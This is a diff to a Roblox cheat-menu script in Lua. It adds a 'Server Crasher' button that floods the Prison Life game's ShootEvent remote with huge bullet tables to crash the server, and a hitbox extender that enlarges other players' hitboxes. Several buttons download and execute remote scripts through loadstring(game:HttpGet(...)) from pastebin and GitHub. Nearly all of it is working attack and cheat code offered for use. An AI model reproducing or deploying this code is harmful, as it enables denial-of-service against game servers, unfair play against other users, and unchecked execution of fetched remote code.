@@ -1,4 +1,4 @@
--- thx kinlei for material xoxo
+-- yas
 local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
 
 local X = Material.Load({
@@ -14,23 +14,195 @@ local X = Material.Load({
 
 
 local Z = X.New({
-    Title = "Local"
+    Title = "Server Crasher"
 })
 
-local Z = X.New({
-    Title = "Server Crasher"
+local A = Z.Button({
+    Text = "Prison life",
+    Callback = function()
+        
+        local Players = game:GetService("Players") 
+        local RStorage = game:GetService("ReplicatedStorage")
+        local SendCrash = RStorage:WaitForChild("ShootEvent")
+        local packetamount = 5000
+        local packetsend = 150
+        local bulletlength = math.huge  
+        local Tool = "Remington 870"  
+        
+        function getCrashTool()
+        local Player = Players.LocalPlayer 
+        local Backpack = Player:FindFirstChild("Backpack")
+        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Tool].ITEMPICKUP)
+        return Backpack:FindFirstChild(Tool)
+        end
+        
+        function crash()
+        local CrashTable = { }
+        for i=1, packetamount do 
+        CrashTable[i] = {
+        Cframe = CFrame.new(),
+        Distance = bulletlength }
+        end
+        for i=1, packetsend do 
+        SendCrash:FireServer(CrashTable,getCrashTool())
+        end
+        end
+        
+        crash()
+    end,
+    Menu = {
+        Information = function(self)
+            X.Banner({
+                Text = "crash prison life"
+            })
+        end
+    }
 })
 
 local Z = X.New({
     Title = "Combat"
 })
 
+
+local A = Z.Button({
+    Text = "Hitbox extender",
+    Callback = function()
+        
+        _G.HeadSize = 10
+        _G.Disabled = true
+    
+        game:GetService('RunService').RenderStepped:connect(function()
+            if _G.Disabled then
+                for i,v in next, game:GetService('Players'):GetPlayers() do
+                    if v.Name ~= game:GetService('Players').LocalPlayer.Name then
+                        pcall(function()
+                            v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
+                            v.Character.HumanoidRootPart.CanCollide = false
+                        end)
+                    end
+                end
+            end
+        end)
+    end,
+    Menu = {
+        Information = function(self)
+            X.Banner({
+                Text = "enable hitboxes"
+            })
+        end
+    }
+})
+
+local A = Z.Button({
+    Text = "Reset Hitbox",
+    Callback = function()
+        
+        _G.HeadSize = 5
+        _G.Disabled = true
+    
+        game:GetService('RunService').RenderStepped:connect(function()
+            if _G.Disabled then
+                for i,v in next, game:GetService('Players'):GetPlayers() do
+                    if v.Name ~= game:GetService('Players').LocalPlayer.Name then
+                        pcall(function()
+                            v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
+                            v.Character.HumanoidRootPart.CanCollide = false
+                        end)
+                    end
+                end
+            end
+        end)    end,
+    Menu = {
+        Information = function(self)
+            X.Banner({
+                Text = "reset hitboxes"
+            })
+        end
+    }
+})
+
 local Z = X.New({
     Title = "Radar"
 })
 
+local A = Z.Button({
+    Text = "simple radar",
+    Callback = function()
+        
+        loadstring(game:HttpGet("https://pastebin.com/raw/5YPGb6mJ", true))()
+    end,
+    Menu = {
+        Information = function(self)
+            X.Banner({
+                Text = "2014 cheat styled radar"
+            })
+        end
+    }
+})
+
+local A = Z.Button({
+    Text = "radar",
+    Callback = function()
+        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Blissful4992/ESPs/main/PlayerRadar.luaJ", true))()
+    end,
+    Menu = {
+        Information = function(self)
+            X.Banner({
+                Text = "default radar"
+            })
+        end
+    }
+})
+
+
 local Z = X.New({
     Title = "FE scripts"
+})
+
+local A = Z.Button({
+    Text = "Noob God [56]",
+    Callback = function()
+        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeExtraChips/f/main/noob", true))()
+    end,
+    Menu = {
+        Information = function(self)
+            X.Banner({
+                Text = "only works in r6 games"
+            })
+        end
+    }
+})
+
+local A = Z.Button({
+    Text = "Mad Wizard [R6]",
+    Callback = function()
+        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeExtraChips/f/main/Wizard", true))()
+    end,
+    Menu = {
+        Information = function(self)
+            X.Banner({
+                Text = "only works in R6 games"
+            })
+        end
+    }
+})
+
+local A = Z.Button({
+    Text = "Gangster [R6]",
+    Callback = function()
+        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeExtraChips/f/main/gangster", true))()
+    end,
+    Menu = {
+        Information = function(self)
+            X.Banner({
+                Text = "only works in R6 games"
+            })
+        end
+    }
 })
 
 local Z = X.New({
@@ -165,14 +337,14 @@ local A = Z.Button({
     Menu = {
         Information = function(self)
             X.Banner({
-                Text = "Infinite Jump"
+                Text = "Give Btools"
             })
         end
     }
 })
 
 local A = Z.Button({
-    Text = "Unlock workspace For Btools",
+    Text = "Unlock workspace",
     Callback = function()
         rec = function(k)
             for _, Obj in pairs(k:GetChildren()) do
@@ -188,7 +360,21 @@ local A = Z.Button({
     Menu = {
         Information = function(self)
             X.Banner({
-                Text = "Infinite Jump"
+                Text = "Unlock workspace for Btools"
+            })
+        end
+    }
+})
+
+local A = Z.Button({
+    Text = "Rejoin (used to disable scripts)",
+    Callback = function()
+            game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+    end,
+    Menu = {
+        Information = function(self)
+            X.Banner({
+                Text = "Rejoin game"
             })
         end
     }
